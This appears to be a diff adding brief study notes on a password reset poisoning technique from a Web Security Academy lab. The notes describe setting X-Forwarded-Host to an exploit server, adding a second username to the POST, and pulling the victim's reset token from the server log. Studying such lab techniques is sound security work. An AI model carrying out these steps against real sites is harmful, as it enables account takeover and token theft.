@@ -1,0 +1,9 @@
+Pass reset method. 
+
+If X-Forward header supported (Upgrade-Insecure-Requests: 1)
+
+X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
+
+Add another username into the POST
+
+LOG --> different Ip -- get the token
